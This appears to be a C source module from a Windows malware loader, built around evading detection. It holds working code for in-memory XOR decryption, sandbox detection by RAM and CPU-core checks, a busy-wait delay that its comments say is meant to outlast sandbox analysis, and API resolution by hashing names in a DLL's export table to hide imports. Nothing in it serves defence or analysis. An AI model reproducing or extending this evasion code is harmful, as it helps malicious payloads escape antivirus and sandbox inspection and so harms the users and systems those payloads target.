#include "config.h"
#include "evasion.h"
#include <stdio.h>

void xor_crypt(char *data, size_t data_len, const char *key, size_t key_len) {
    if (data_len == 0 || key_len == 0) {
        return; 
    }

    for (size_t i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key[i % key_len];
    }

    // NOTE: no return -> data is modified in RAM
}

bool check_resources() {
    // check RAM
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo); // Windows API to read memory
    
    DWORDLONG ram_gb = memInfo.ullTotalPhys / (1024 * 1024 * 1024);
    
    if (ram_gb < 4) {
        return false; 
    }

    // check CPU cores
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo); // Windows API to read hardware info
    
    if (sysInfo.dwNumberOfProcessors < 2) {
        return false;
    }

    return true;
}

void smart_delay() {
    // NOTE: volatile is fundamental
    // otherwise C compiler would skip the cycle because useless
    volatile int garbage = 0;
    
    // cycle to pass the 3-5 seconds sandbox
    // NOTE: we cannot use Sleep() -> skipped in sandbox
    for (int i = 0; i < SANDBOX_DELAY_CYCLES; i++) {
        garbage += i;
        garbage -= i;
    }
}

DWORD djb2_hash(const char* str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c; // hash * 33 + c
    }
    return hash;
}

FARPROC get_api_by_hash(HMODULE hModule, DWORD api_hash) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    // find NT header
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    // get EAT address
    IMAGE_DATA_DIRECTORY exportDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.Size == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDir.VirtualAddress);

    // get EAT arrays
    PDWORD pNames = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfNames);
    PWORD pOrdinals = (PWORD)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);
    PDWORD pFunctions = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfFunctions);

    // cycle all functions exported by the DLL
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* functionName = (char*)((BYTE*)hModule + pNames[i]);
        
        // calculate hash of current function name
        DWORD current_hash = djb2_hash(functionName);

        if (current_hash == api_hash) {
            // get function address
            WORD ordinal = pOrdinals[i];
            FARPROC functionAddress = (FARPROC)((BYTE*)hModule + pFunctions[ordinal]);
            return functionAddress;
        }
    }

    return NULL; // function not found
}